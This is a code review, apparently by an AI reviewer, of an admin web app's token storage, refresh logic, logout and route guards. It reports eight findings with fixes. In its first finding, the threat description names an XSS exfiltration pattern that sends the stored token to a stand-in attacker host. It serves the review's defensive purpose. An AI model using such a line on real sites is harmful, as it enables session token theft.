# Segment 21 — Admin SPA: auth store & guards 🔥 — review findings

Scope review against the [Segment 21 checklist](CODE_REVIEW_ROADMAP.md#segment-21--admin-spa--auth-store--guards-) of [CODE_REVIEW_ROADMAP.md](CODE_REVIEW_ROADMAP.md). Files in scope: [stores/useAuthStore.ts](frontend-admin/src/stores/useAuthStore.ts), [router/index.ts](frontend-admin/src/router/index.ts), [services/api-client.ts](frontend-admin/src/services/api-client.ts), [views/LoginView.vue](frontend-admin/src/views/LoginView.vue), [views/ConfirmEmailView.vue](frontend-admin/src/views/ConfirmEmailView.vue), [views/AcceptInviteView.vue](frontend-admin/src/views/AcceptInviteView.vue). Cross-references: [main.ts](frontend-admin/src/main.ts), [index.html](frontend-admin/index.html), and the backend `AuthController` ([backend/RestaurantApi/Controllers/AuthController.cs](backend/RestaurantApi/Controllers/AuthController.cs)).

Reviewer: Claude (Opus 4.7). Date: 2026-05-21. Branch reviewed: `main` at `fb59c7e`.

## Verdict

**8 findings, three HIGH; the 🔥 item fails.** The shell shape is right and several items pass cleanly: the auth store correctly re-fetches `user` + `accessibleRestaurants` on first navigation after reload ([router/index.ts:96-106](frontend-admin/src/router/index.ts#L96-L106)) so a stale token surfaces as a guard-time `logout()` → `/login` redirect rather than a stale view; `LoginView` does not autofill from URL params and does not log credentials; `AcceptInviteView` correctly reads the token from the URL and sends it in the request *body* ([AcceptInviteView.vue:15, 22](frontend-admin/src/views/AcceptInviteView.vue#L15-L22) → [api-client.ts:184-188](frontend-admin/src/services/api-client.ts#L184-L188)) — not in a query string. No `eval`, no `new Function()`, no `v-html`, no `innerHTML` (grep across the admin SPA returns zero matches). Route-level lazy imports point at local module paths only ([router/index.ts:11, 17, 23, 28, 38, 43, 48, 53, 58, 67, 72, 77](frontend-admin/src/router/index.ts) — every `() => import('@/...')` is a static literal). The "EmailNotConfirmedError" branch ([api-client.ts:55-62, 100-105](frontend-admin/src/services/api-client.ts#L55-L105)) is the well-shaped exception that drives `LoginView`'s "Resend confirmation" UI — good error-type typing across the boundary.

The findings cluster around three themes:

1. **The 🔥 token-storage item fails.** [F1](#f1--high--refresh-token-lives-in-localstorage-no-httponly-cookie-no-csp-no-documented-xss-acceptance--) — both `accessToken` and `refreshToken` are persisted to `localStorage` ([useAuthStore.ts:66-75](frontend-admin/src/stores/useAuthStore.ts#L66-L75)). The roadmap states the trade-off explicitly: *"if in `localStorage`, document the XSS risk acceptance. Prefer `httpOnly` cookie if available; if not, ensure CSP is strict."* Neither alternative is in place: there's no httpOnly cookie path on the backend, there's no `Content-Security-Policy` meta tag in [index.html](frontend-admin/index.html), and no header policy configured anywhere in the build. Compound effect: a single XSS payload yields the refresh token, and the refresh token's 30-day lifetime ([appsettings.Development.json:13](backend/RestaurantApi/appsettings.Development.json#L13) — `RefreshTokenDays: 30`) means the attacker has a month of access. Worse, [F3](#f3--high--logout-is-clientonly-no-backend-revocation-the-refresh-token-stays-valid-for-up-to-30-days-after-logout) means the user can't even revoke the leaked token by clicking "log out."
2. **Concurrent 401s break the session.** [F2](#f2--high--concurrent-401s-trigger-n-parallel-refresh-calls-singleuse-refresh-token-guarantees-n1-of-them-fail--logout) — `authedFetcher` calls `auth.tryRefresh()` on every 401 with no coordination ([api-client.ts:135-138](frontend-admin/src/services/api-client.ts#L135-L138)). Multiple in-flight requests after access-token expiry each trigger their own refresh, but the backend rotates refresh tokens single-use ([AuthController.cs:149-167](backend/RestaurantApi/Controllers/AuthController.cs#L149-L167)) — only the first refresh succeeds, the rest hit 401 from the rotated/revoked token, `tryRefresh` catches → calls `logout()` → the user is kicked out mid-session. The roadmap explicitly names this: *"Access-token refresh logic in `api-client.ts` handles concurrent 401s — multiple in-flight requests should trigger a single refresh, not N."*
3. **Logout doesn't revoke server-side.** [F3](#f3--high--logout-is-clientonly-no-backend-revocation-the-refresh-token-stays-valid-for-up-to-30-days-after-logout) — `logout()` clears local state ([useAuthStore.ts:152-159](frontend-admin/src/stores/useAuthStore.ts#L152-L159)) and that's it. No `POST /api/auth/logout` exists on the backend (grep `HttpPost.*logout\|auth/logout\|RevokeToken` across [Controllers/AuthController.cs](backend/RestaurantApi/Controllers/AuthController.cs) returns zero) and no client call is made. The refresh token remains valid until it expires or is rotated. Roadmap explicit ask.

The remaining items are smaller: [F4](#f4--medium--route-guards-check-authentication-only-not-rolemembership-orgowneronly-views-render-for-restaurantadmins) — `router.beforeEach` checks `isAuthenticated` ([router/index.ts:82-118](frontend-admin/src/router/index.ts#L82-L118)) but doesn't check whether the active user has the role required for the destination route; `isOrgOwnerOfActive` ([useAuthStore.ts:57-64](frontend-admin/src/stores/useAuthStore.ts#L57-L64)) is computed but the guard never consults it, so a `RestaurantAdmin` can navigate to `/organization` (an OrgOwner-only surface) and watch an empty page render while the API 403s. [F5](#f5--medium--tryrefresh-race-with-logout-an-inflight-refresh-can-setsession-after-logout-clears-state) — `tryRefresh()` and `logout()` race: a refresh in flight when the user clicks logout can `setSession()` after `logout()` has cleared the store, repopulating tokens silently. [F6](#f6--low--accessiblerestaurants-loaded-via-n1-orgs-then-restaurantsperorg) — `loadAccessibleRestaurants` does N+1 queries (one for orgs, then one per org for restaurants, [useAuthStore.ts:123-145](frontend-admin/src/stores/useAuthStore.ts#L123-L145)). [F7](#f7--low--tryrefresh-and-confirmemail-dont-reload-accessiblerestaurants-membership-drift-not-picked-up-mid-session) — `tryRefresh` and `confirmEmail` don't reload `accessibleRestaurants`; an invite accepted on another tab during a session is invisible until the next reload. [F8](#f8--low--loadpersisted-jsonparses-without-type-validation) — `loadPersisted` accepts whatever JSON was in `localStorage` without type validation; a corrupted entry silently boots the auth store with `accessToken: 12345`.

What does check out, beyond the verdict opener: `setSession()` is the single point of token mutation ([line 77-82](frontend-admin/src/stores/useAuthStore.ts#L77-L82)) — `login`, `confirmEmail`, and `tryRefresh` all funnel through it, making auditing easy. The router guard at [router/index.ts:96-106](frontend-admin/src/router/index.ts#L96-L106) correctly handles the post-reload state restoration: in-memory `user` and `accessibleRestaurants` are recomputed from the backend before any guarded view evaluates. The `EmailNotConfirmedError` type ([api-client.ts:55-62](frontend-admin/src/services/api-client.ts#L55-L62)) propagates the backend's `code: "email_not_confirmed"` ([AuthController.cs:138-144](backend/RestaurantApi/Controllers/AuthController.cs#L138-L144)) as a typed error rather than a string-match — the right shape. `AcceptInviteView` reads the token from `route.query.token` and POSTs it in the body ([line 15, 22](frontend-admin/src/views/AcceptInviteView.vue#L15-L22), [api-client.ts:185-187](frontend-admin/src/services/api-client.ts#L185-L187)) — the URL is the bootstrap, but the request avoids logging the token in proxy access logs. `LoginView` uses `autocomplete="current-password"` / `autocomplete="username"` ([line 112, 119](frontend-admin/src/views/LoginView.vue#L112-L119)) so the browser's password manager engages properly. Lazy-route imports are local-path-only — no dynamic-import-from-URL pattern.

---

## Checklist coverage

| Item | Status | Evidence |
|---|---|---|
| 🔥 Refresh token storage: if in `localStorage`, document the XSS risk acceptance. Prefer `httpOnly` cookie if available; if not, ensure CSP is strict | ❌ Fail — see [F1](#f1--high--refresh-token-lives-in-localstorage-no-httponly-cookie-no-csp-no-documented-xss-acceptance--) | Tokens in `localStorage` ([useAuthStore.ts:66-75](frontend-admin/src/stores/useAuthStore.ts#L66-L75)). No `Set-Cookie` path on the backend. No CSP in [index.html](frontend-admin/index.html) or any vite/server config. No documented XSS-risk acceptance comment anywhere in the auth store. |
| Access-token refresh logic in `api-client.ts` handles **concurrent 401s** — multiple in-flight requests should trigger a single refresh, not N | ❌ Fail — see [F2](#f2--high--concurrent-401s-trigger-n-parallel-refresh-calls-singleuse-refresh-token-guarantees-n1-of-them-fail--logout) | `authedFetcher` ([api-client.ts:122-140](frontend-admin/src/services/api-client.ts#L122-L140)) calls `auth.tryRefresh()` on every 401 independently; no coalescing. |
| On refresh failure, the user is redirected to `/login` and the store cleared | ✓ Pass | `tryRefresh` catches and calls `logout()` ([useAuthStore.ts:113-116](frontend-admin/src/stores/useAuthStore.ts#L113-L116)). Router guard sends unauthenticated users to `/login` ([router/index.ts:87](frontend-admin/src/router/index.ts#L87)). |
| Route guards check both authentication **and** role/membership for restricted routes — list every guarded route | ⚠ Partial — see [F4](#f4--medium--route-guards-check-authentication-only-not-rolemembership-orgowneronly-views-render-for-restaurantadmins) | Authentication ✓ ([router/index.ts:82-91](frontend-admin/src/router/index.ts#L82-L91)). Role/membership ❌ — `isOrgOwnerOfActive` exists ([useAuthStore.ts:57-64](frontend-admin/src/stores/useAuthStore.ts#L57-L64)) but no guard consults it. `/organization` is OrgOwner-only at the API but reachable by any authenticated user from the client. |
| Restored-from-localStorage user state is **re-verified** with the backend on app boot (a token might have been revoked) | ✓ Pass | [router/index.ts:96-106](frontend-admin/src/router/index.ts#L96-L106) — on first nav after reload, `fetchMe()` and `loadAccessibleRestaurants()` run; either failure triggers `logout()` + redirect to `/login`. |
| Logout: clears tokens, clears stores, redirects to login, calls backend `/logout` (so refresh token is revoked) | ❌ Fail — see [F3](#f3--high--logout-is-clientonly-no-backend-revocation-the-refresh-token-stays-valid-for-up-to-30-days-after-logout) | Local clear ✓ ([useAuthStore.ts:152-159](frontend-admin/src/stores/useAuthStore.ts#L152-L159)). Redirect happens at the next guard pass ✓. Backend revocation ❌ — no `/api/auth/logout` endpoint exists and no client call is made. |
| `LoginView` does not log credentials, does not autofill from URL params | ✓ Pass | No `console.log` in [LoginView.vue](frontend-admin/src/views/LoginView.vue). No `route.query.email` / `route.query.password` reads. `redirect` query param is honoured for post-login navigation only ([line 35-36](frontend-admin/src/views/LoginView.vue#L35-L36)). |
| `AcceptInvite` token comes from URL, is sent in the body, is single-use server-side | ✓ Pass (client) | Token from `route.query.token` ([AcceptInviteView.vue:15](frontend-admin/src/views/AcceptInviteView.vue#L15)), sent in body ([api-client.ts:185-187](frontend-admin/src/services/api-client.ts#L185-L187) → `JSON.stringify({ token })`). Single-use is server-side: [AuthController.cs:215](backend/RestaurantApi/Controllers/AuthController.cs#L215) sets `Status="accepted"` on success. |
| No `eval`, no dynamic imports of untrusted URLs | ✓ Pass | Grep `\beval\(\|new Function\(\|document.write\|innerHTML\|v-html` returns zero matches. Every `() => import('@/...')` is a static module path. |
| If a user belongs to multiple restaurants, how is the "current restaurant" selected and how is it changed? Where is it persisted? (roadmap `↳`) | ✓ Pass (selection) — see [F7](#f7--low--tryrefresh-and-confirmemail-dont-reload-accessiblerestaurants-membership-drift-not-picked-up-mid-session) for the drift case | `activeRestaurantId` is persisted to `localStorage` ([useAuthStore.ts:48, 68-72](frontend-admin/src/stores/useAuthStore.ts)); first restaurant auto-selected if persisted value is invalid ([line 138-144](frontend-admin/src/stores/useAuthStore.ts#L138-L144)); changed via `setActiveRestaurant()` ([line 147-150](frontend-admin/src/stores/useAuthStore.ts#L147-L150)). |

---

## F1 — HIGH — Refresh token lives in `localStorage`; no `httpOnly` cookie, no CSP, no documented XSS acceptance 🔥

[useAuthStore.ts:66-75](frontend-admin/src/stores/useAuthStore.ts#L66-L75):

```ts
function persist() {
  localStorage.setItem(
    STORAGE_KEY,
    JSON.stringify({
      accessToken: accessToken.value,
      refreshToken: refreshToken.value,
      activeRestaurantId: activeRestaurantId.value,
    } satisfies PersistedAuth),
  )
}
```

Both tokens land in `localStorage` keyed `'sr_admin_auth'`. The roadmap names the trade-off precisely: *"if in `localStorage`, document the XSS risk acceptance. Prefer `httpOnly` cookie if available; if not, ensure CSP is strict."* Three layers checked:

- **`httpOnly` cookie path?** Grep `Cookie\|CookieOptions\|SetCookie` across [backend/RestaurantApi/](backend/RestaurantApi/) returns zero matches. The backend authentication is JWT-bearer-only ([Program.cs:49-78](backend/RestaurantApi/Program.cs#L49-L78)); tokens travel in the `Authorization` header. No cookie auth handler is registered. So the httpOnly alternative isn't structurally available without a server-side change.
- **CSP?** [frontend-admin/index.html](frontend-admin/index.html) — no `<meta http-equiv="Content-Security-Policy">`. [vite.config.ts](frontend-admin/vite.config.ts) — no header injection. The backend serves only the JSON API, not the SPA HTML (dev: Vite; prod: separate deployment). So a CSP header would need either a meta tag in `index.html` or a reverse proxy. Neither exists.
- **Documented XSS acceptance?** Grep `XSS\|localStorage.*XSS\|risk.*acceptance` across [stores/useAuthStore.ts](frontend-admin/src/stores/useAuthStore.ts) returns no comment. The decision is undocumented; a future reader can't tell if `localStorage` is a deliberate trade-off or an unconsidered default.

The compound risk:

- The refresh token has a 30-day lifetime ([appsettings.Development.json:13](backend/RestaurantApi/appsettings.Development.json#L13) — `RefreshTokenDays: 30`).
- A single XSS payload — via a stored-XSS in an admin-visible product name, an unescaped chat message, a vulnerable Vue dependency — reads `localStorage.getItem('sr_admin_auth')` and exfiltrates the refresh token.
- The attacker then has 30 days of access. [F3](#f3--high--logout-is-clientonly-no-backend-revocation-the-refresh-token-stays-valid-for-up-to-30-days-after-logout) means the user can't shorten that window by logging out.
- Vue 3 has the default `v-html` XSS surface (the segment-20 audit confirms it's not used in the customer SPA; the admin SPA also returns zero `v-html` hits today), but every npm dependency is an XSS vector and the admin SPA depends on `pinia`, `vue-router`, `tailwindcss`, etc. — supply-chain XSS via a compromised dependency would land tokens for free.

Three orthogonal fixes (any one mitigates):

- **httpOnly cookie path.** Add a `Set-Cookie` response on `/api/auth/login` and `/api/auth/refresh` that emits the refresh token as `HttpOnly; Secure; SameSite=Strict`. The access token can stay in memory. This is the strongest fix but requires backend changes and CORS coordination ([Program.cs:163-164](backend/RestaurantApi/Program.cs#L163-L164) — `AllowCredentials()` is already on).
- **CSP.** Add `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; ...">` to [index.html](frontend-admin/index.html). Bounds the XSS blast radius — an injected script can't exfiltrate to an attacker-controlled domain. Doesn't help against a same-origin XSS (`fetch` to a same-origin endpoint with the token), but stops the easy "drop the token in an `<img src=evil.com/?t=...>`" pattern.
- **Document the acceptance.** A comment in `useAuthStore.ts` near `persist()`: *"Tokens are persisted to localStorage. This is acceptable for the current threat model because [...]. Note that this requires admin SPA dependencies to be tightly audited and CSP must be added before this decision can stand."* The decision is then visible to the next reader and reviewable.

Today: none of the three.

---

## F2 — HIGH — Concurrent 401s trigger N parallel refresh calls; single-use refresh token guarantees N-1 of them fail → `logout()`

[api-client.ts:122-140](frontend-admin/src/services/api-client.ts#L122-L140):

```ts
async function authedFetcher<T>(endpoint: string, options?: RequestInit): Promise<T> {
  const auth = useAuthStore();

  const doFetch = () =>
    fetch(`${BASE_URL}${endpoint}`, {
      ...options,
      headers: {
        'Content-Type': 'application/json',
        ...(auth.accessToken ? { Authorization: `Bearer ${auth.accessToken}` } : {}),
        ...options?.headers,
      },
    });

  let response = await doFetch();
  if (response.status === 401 && (await auth.tryRefresh())) {
    response = await doFetch();
  }
  return parseOrThrow<T>(response);
}
```

And [useAuthStore.ts:107-117](frontend-admin/src/stores/useAuthStore.ts#L107-L117):

```ts
async function tryRefresh(): Promise<boolean> {
  if (!refreshToken.value) return false
  try {
    setSession(await authApi.refresh(refreshToken.value))
    return true
  } catch {
    logout()
    return false
  }
}
```

Concrete failure trace when access token has just expired and a view fires multiple requests:

1. **T+0:** A view (e.g., `DashboardView`) issues five parallel `apiClient.*` calls: `getMetrics`, `getOrders`, `getActiveOrders`, `getDirectives`, `getMenu`. Each enters `authedFetcher` independently.
2. **T+1:** All five receive `401 Unauthorized` from the backend (access token expired).
3. **T+2:** All five call `auth.tryRefresh()` in parallel. Each reads `refreshToken.value` from the in-memory `ref` — they all read the *same* refresh token value because no mutation has happened yet.
4. **T+3:** All five POST to `/api/auth/refresh` with the same refresh token. The backend's `Refresh` endpoint marks the token revoked and issues a new pair *atomically* (per [AuthController.cs:149-167](backend/RestaurantApi/Controllers/AuthController.cs#L149-L167)).
5. **T+4:** One of the five (the first to land at the DB) succeeds and returns new tokens. The other four return `401 Unauthorized` because the refresh token is now revoked.
6. **T+5:** The four failed `tryRefresh` calls catch the error and call `logout()` — which clears tokens *that the successful call just set*.
7. **T+6:** The user is logged out mid-session despite having a valid refresh token a second ago.

The roadmap names this precisely: *"Access-token refresh logic in `api-client.ts` handles concurrent 401s — multiple in-flight requests should trigger a single refresh, not N."*

The fix is one ref:

```ts
let refreshInFlight: Promise<boolean> | null = null

async function tryRefresh(): Promise<boolean> {
  if (!refreshToken.value) return false
  if (refreshInFlight) return refreshInFlight  // coalesce
  refreshInFlight = (async () => {
    try {
      setSession(await authApi.refresh(refreshToken.value))
      return true
    } catch {
      logout()
      return false
    } finally {
      refreshInFlight = null
    }
  })()
  return refreshInFlight
}
```

All N parallel callers await the same promise; only one HTTP refresh happens. Standard pattern; not present here.

The current state is essentially a session-killing race condition that fires every time the access token expires while the user has more than one inflight request — which is most page loads.

---

## F3 — HIGH — `logout()` is client-only; no backend revocation; the refresh token stays valid for up to 30 days after "logout"

[useAuthStore.ts:152-159](frontend-admin/src/stores/useAuthStore.ts#L152-L159):

```ts
function logout() {
  accessToken.value = null
  refreshToken.value = null
  user.value = null
  activeRestaurantId.value = null
  accessibleRestaurants.value = []
  localStorage.removeItem(STORAGE_KEY)
}
```

`logout()` mutates state. No `authApi.logout(refreshToken.value)` call. And the backend doesn't accept one — grep `HttpPost.*logout\|RevokeToken` across [AuthController.cs](backend/RestaurantApi/Controllers/AuthController.cs) returns zero hits. The only refresh-token revocation path on the backend is *rotation*: `Refresh()` revokes the used token and issues a new pair ([line 162-164](backend/RestaurantApi/Controllers/AuthController.cs#L162-L164)).

Consequences:

- **A logged-out user still has a valid token on the backend.** The `localStorage` entry is gone, so the *client* can't use it. But anyone who exfiltrated it earlier (via [F1](#f1--high--refresh-token-lives-in-localstorage-no-httponly-cookie-no-csp-no-documented-xss-acceptance--)'s XSS surface) retains usage until natural expiry.
- **Shared-device scenario.** Two admins share a workstation. Admin A logs in, works, clicks "log out." The local state is cleared and the next user lands on `/login`. But Admin A's refresh token is still valid; any out-of-band record of it (browser-extension capture, screen-share at login, password manager mishap) is good for ~30 days.
- **30-day window.** [appsettings.Development.json:13](backend/RestaurantApi/appsettings.Development.json#L13) — `RefreshTokenDays: 30`. The roadmap (Segment 5) names this as configurable; the admin user has no way to shorten it.

The roadmap's explicit ask: *"Logout: clears tokens, clears stores, redirects to login, calls backend `/logout` (so refresh token is revoked)."* Three of the four happen; the fourth doesn't.

Fix is two changes: one new backend endpoint, one client call.

- Backend: `[HttpPost("logout")]` on `AuthController`, accepts the refresh token in body, marks `RevokedAt = DateTime.UtcNow` on the matching `RefreshTokens` row, returns 204.
- Client: `useAuthStore.logout()` calls `authApi.logout(refreshToken.value)` *before* clearing local state. The `await` is best-effort: catch and ignore any error so a network failure doesn't strand the user logged-in client-side.

Cross-refs [Segment 5](CODE_REVIEW_ROADMAP.md#segment-05--authentication--token-lifecycle) — the auth-lifecycle roadmap item *"Refresh token revocation: logout marks the token revoked"* is the same gap viewed from the backend.

---

## F4 — MEDIUM — Route guards check authentication only, not role/membership; OrgOwner-only views render for RestaurantAdmins

[router/index.ts:82-118](frontend-admin/src/router/index.ts#L82-L118):

```ts
router.beforeEach(async (to) => {
  const auth = useAuthStore()
  const isPublic = to.meta.public === true

  if (!auth.isAuthenticated) {
    return isPublic ? true : { name: 'login', query: { redirect: to.fullPath } }
  }
  if (isPublic) return { path: '/' }

  // ... user/restaurant hydration ...

  if (to.name === 'accept-invite') return true
  if (auth.accessibleRestaurants.length === 0) {
    return to.name === 'onboarding' ? true : { name: 'onboarding' }
  }
  if (to.name === 'onboarding') return { path: '/' }

  return true
})
```

The guard distinguishes:

- **Authenticated vs unauthenticated** ✓
- **Has memberships vs no memberships (onboarding)** ✓
- **Currently on a public page vs guarded page** ✓

It does *not* distinguish:

- **OrgOwner vs RestaurantAdmin** for views that are OrgOwner-only.
- **Membership in the active restaurant** for views that depend on it.

The auth store has the building block: `isOrgOwnerOfActive` ([useAuthStore.ts:57-64](frontend-admin/src/stores/useAuthStore.ts#L57-L64)) — but no guard or view reads it. Concrete consequences:

- A user with role `RestaurantAdmin` for restaurant X can navigate to `/organization`. The view ([OrganizationView.vue](frontend-admin/src/views/OrganizationView.vue)) renders. The first API call (`orgApi.listInvitations` etc.) returns 403 from the backend ([OrganizationsController.cs:138](backend/RestaurantApi/Controllers/OrganizationsController.cs#L138)). The UI shows an error toast, an empty page, or stack-traces — depending on how the view handles the error.
- Same shape for any other OrgOwner-only future surface. The backend defense-in-depth catches the unauthorized data fetch, but the user experience is "I clicked a link in the sidebar and saw an error" rather than "the link wasn't shown to me in the first place."

The roadmap names defense-in-depth: *"Route guards check both authentication and role/membership for restricted routes — list every guarded route."* Today the role-check half is structurally absent.

Fix shape (out of scope): add `meta: { requiresOrgOwner: true }` to OrgOwner-only routes; extend the guard with `if (to.meta.requiresOrgOwner && !auth.isOrgOwnerOfActive) return { path: '/' }`. Mirror with `meta: { roles: ['RestaurantAdmin', 'OrgOwner'] }` for restaurant-level routes. The auth store already exposes `user.memberships`; the guard has everything it needs.

Worth listing the *current* navigable surface:

| Path | Sensitivity | Today's guard |
|---|---|---|
| `/login` / `/confirm-email` | public | `meta.public === true` ✓ |
| `/accept-invite` | post-auth, any user | special case in guard ✓ |
| `/onboarding` | new user without memberships | special case ✓ |
| `/` (dashboard) | any authenticated user with memberships | ✓ |
| `/menu` / `/menu/import` | RestaurantAdmin+ | role check missing |
| `/ai-config`, `/rules` | RestaurantAdmin+ | role check missing |
| `/orders`, `/orders/active` | RestaurantAdmin+ | role check missing |
| `/tables` | RestaurantAdmin+ | role check missing |
| `/organization` | **OrgOwner only** | role check missing |

The "RestaurantAdmin+" rows are less acute (the API enforces; the client mostly works), but `/organization` is the live gap.

---

## F5 — MEDIUM — `tryRefresh` race with `logout`: an in-flight refresh can `setSession` after `logout()` clears state

The race is subtle. Sequence:

1. **T+0:** User has tokens. A background request fires through `authedFetcher` and hits 401.
2. **T+1:** `authedFetcher` calls `auth.tryRefresh()`. The promise begins; the refresh-network-call is in flight.
3. **T+2:** User clicks "Log out." `auth.logout()` runs synchronously, clearing `accessToken`, `refreshToken`, `user`, `activeRestaurantId`, and `localStorage`.
4. **T+3:** The refresh-network-call from step 2 returns successfully. `tryRefresh`'s `try` block executes `setSession(await authApi.refresh(...))` — which sets `accessToken`, `refreshToken`, `user` all back to populated values and **calls `persist()` writing them back to `localStorage`**.
5. **T+4:** The user is "logged in" again from a network response that arrived after the logout intent.

There's no abort signal. The router guard at the next navigation will see `isAuthenticated === true` and route the user back to the dashboard. Effectively, fast clicking "Log out" while a 401 was inflight reverts the logout.

This is also a security adjacency: if a user logs out *because they suspect compromise*, the in-flight refresh nullifies the logout intent. Combined with [F3](#f3--high--logout-is-clientonly-no-backend-revocation-the-refresh-token-stays-valid-for-up-to-30-days-after-logout) (no server-side revocation), the user's "I want to log out *now*" intent can be silently undone.

Fix shape: `logout()` should mark a `loggedOut` flag; `tryRefresh`'s success path checks the flag and bails (`if (loggedOutSinceStart) return false`) before calling `setSession`. Or — cleaner — use an `AbortController`:

```ts
let logoutSignal: AbortController | null = null

function logout() {
  logoutSignal?.abort()
  // ... clear state ...
}

async function tryRefresh() {
  const signal = (logoutSignal ??= new AbortController()).signal
  try {
    const res = await authApi.refresh(refreshToken.value, { signal })
    if (!signal.aborted) setSession(res)
    return !signal.aborted
  } catch { /* ... */ }
}
```

Out of scope for this review.

---

## F6 — LOW — `accessibleRestaurants` loaded via N+1 (orgs, then restaurants-per-org)

[useAuthStore.ts:123-145](frontend-admin/src/stores/useAuthStore.ts#L123-L145):

```ts
async function loadAccessibleRestaurants() {
  const orgs = await orgApi.listOrganizations()
  const lists = await Promise.all(
    orgs.map(async (o) => {
      const restaurants = await orgApi.listRestaurants(o.id)
      return restaurants.map((r) => ({ id: r.id, name: r.name, organizationId: o.id }))
    }),
  )
  accessibleRestaurants.value = lists.flat()
  // ...
}
```

For a user with N organisations, this issues N+1 requests (one for orgs, N for restaurants). The `Promise.all` parallelizes the inner calls, so latency is one round-trip — but the request count grows linearly. Today most users have 1-2 orgs, so this is fine. As the product grows multi-org admins (chain restaurants, holding-company orgs), this needs a single `GET /api/me/restaurants` returning the flat list.

The roadmap doesn't name this directly but it's the kind of "build it once, scales nicely" finding that gets cheap to fix now and expensive later. The backend `OrganizationsController` doesn't expose a flat endpoint today (no `GET /api/me/restaurants` in [OrganizationsController.cs](backend/RestaurantApi/Controllers/OrganizationsController.cs)) — that's the prerequisite.

---

## F7 — LOW — `tryRefresh` and `confirmEmail` don't reload `accessibleRestaurants`; membership drift not picked up mid-session

[useAuthStore.ts:107-117](frontend-admin/src/stores/useAuthStore.ts#L107-L117):

```ts
async function tryRefresh(): Promise<boolean> {
  if (!refreshToken.value) return false
  try {
    setSession(await authApi.refresh(refreshToken.value))
    return true
  } catch {
    logout()
    return false
  }
}
```

`tryRefresh` calls `setSession` which mutates `user.value` (via `res.user`). But it does *not* call `loadAccessibleRestaurants()`. If a new invitation was accepted (or a new restaurant added to the user's org) during the access-token window, the `accessibleRestaurants` list stays stale until the next page reload.

Same pattern in `confirmEmail` ([line 98-101](frontend-admin/src/stores/useAuthStore.ts#L98-L101)) — `setSession` updates user, then explicitly calls `loadAccessibleRestaurants()`. That path is correct. `tryRefresh` doesn't follow it.

The roadmap doesn't call this out specifically — it's a sub-case of the broader "re-verify on boot" item, which is satisfied at boot time by the router guard ([router/index.ts:96-106](frontend-admin/src/router/index.ts#L96-L106)). The mid-session drift is a smaller surface. LOW because it requires a specific multi-tab / multi-actor flow (admin invites user A on tab 1; user A accepts on tab 2; their tab 3 still shows old restaurant list until reload).

---

## F8 — LOW — `loadPersisted` `JSON.parse`s without type validation

[useAuthStore.ts:34-41](frontend-admin/src/stores/useAuthStore.ts#L34-L41):

```ts
function loadPersisted(): PersistedAuth | null {
  try {
    const raw = localStorage.getItem(STORAGE_KEY)
    return raw ? (JSON.parse(raw) as PersistedAuth) : null
  } catch {
    return null
  }
}
```

The `as PersistedAuth` cast is unchecked. Concrete failure modes the cast hides:

- A corrupted entry (e.g., truncated mid-write because the browser crashed) parses partially; missing keys are `undefined` and become `null` via the `?? null` on initial refs. Safe.
- An entry written by a *different version* of the app (older or newer schema) is accepted as-is. Today there's only one version, but the moment a schema migration happens, the cast is a silent shape-drift.
- A maliciously-crafted entry (`{accessToken: 12345, refreshToken: {nested: 'object'}}`) is loaded; subsequent `Authorization: Bearer 12345` works on a number-cast string, but the moment a code path expects a string method on `refreshToken` (e.g., `refreshToken.value.startsWith(...)` — not present today), it throws.

The fix is two lines:

```ts
const parsed = JSON.parse(raw)
if (typeof parsed?.accessToken !== 'string' && parsed?.accessToken !== null) return null
// etc.
```

…or a tiny validator (`zod` / `valibot`). The `loadPersisted` function returns `null` on any failure today, which would already cover the validator-fails case. The risk surface is small because the data is browser-local and only read once at boot. LOW.

---

## What's solid

| Item | Why it's good |
|---|---|
| Single token-mutation surface ([setSession](frontend-admin/src/stores/useAuthStore.ts#L77-L82)) | `login`, `confirmEmail`, `tryRefresh` all funnel through `setSession`. One place to audit. |
| Post-reload re-verification ([router/index.ts:96-106](frontend-admin/src/router/index.ts#L96-L106)) | The 🔥 "re-verify on boot" item passes — a revoked token at reload time becomes a `logout()` + `/login` redirect cleanly. |
| `EmailNotConfirmedError` typed across the boundary ([api-client.ts:55-62, 100-105](frontend-admin/src/services/api-client.ts#L55-L105)) | The backend's `code: "email_not_confirmed"` shape becomes a typed exception in the SPA; `LoginView` branches on `instanceof` rather than string-matching. |
| `AcceptInvite` token in body, not query ([AcceptInviteView.vue:22](frontend-admin/src/views/AcceptInviteView.vue#L22), [api-client.ts:185-187](frontend-admin/src/services/api-client.ts#L185-L187)) | URL is the bootstrap; the request avoids logging the token in access logs / proxy logs. |
| `LoginView` does not autofill from URL params | The `redirect` query is honoured for post-login navigation only; no `email` / `password` auto-population. |
| `autocomplete` attributes set ([LoginView.vue:112, 119](frontend-admin/src/views/LoginView.vue#L112-L119)) | `autocomplete="username"` and `autocomplete="current-password"` engage the browser's password manager. |
| No `eval`, no dynamic imports of untrusted URLs | Grep returns zero matches across the admin SPA. Every dynamic import is a local module path. |
| Lazy-route imports ([router/index.ts](frontend-admin/src/router/index.ts)) | Every guarded view is `() => import('@/...')` — code-split, no eager load. |
| `activeRestaurantId` persisted with validation on load ([useAuthStore.ts:138-144](frontend-admin/src/stores/useAuthStore.ts#L138-L144)) | An invalid persisted ID falls back to the first accessible restaurant rather than throwing. |

---

## Cross-segment follow-ups raised here

- **[Segment 03](CODE_REVIEW_ROADMAP.md#segment-03--api-startup-pipeline-programcs):** CSP headers — neither the backend nor the SPA configures `Content-Security-Policy`. [F1](#f1--high--refresh-token-lives-in-localstorage-no-httponly-cookie-no-csp-no-documented-xss-acceptance--) names the gap; the natural home for prod CSP is either an `app.Use((ctx, next) => { ctx.Response.Headers["Content-Security-Policy"] = ... })` middleware or a reverse proxy.
- **[Segment 05](CODE_REVIEW_ROADMAP.md#segment-05--authentication--token-lifecycle):** [F3](#f3--high--logout-is-clientonly-no-backend-revocation-the-refresh-token-stays-valid-for-up-to-30-days-after-logout) — Segment 5 names the auth-lifecycle items including "Refresh token revocation: logout marks the token revoked." The missing `/api/auth/logout` endpoint is the upstream gap. Same finding from two angles.
- **[Segment 08](CODE_REVIEW_ROADMAP.md#segment-08--controllers--admin-surface):** [F4](#f4--medium--route-guards-check-authentication-only-not-rolemembership-orgowneronly-views-render-for-restaurantadmins) — the role-policy story is half on the backend (where it's enforced) and half on the client (where it should drive the UI). Segment 8 names policy-based authorization on the controllers; here the SPA-side mirror is missing.
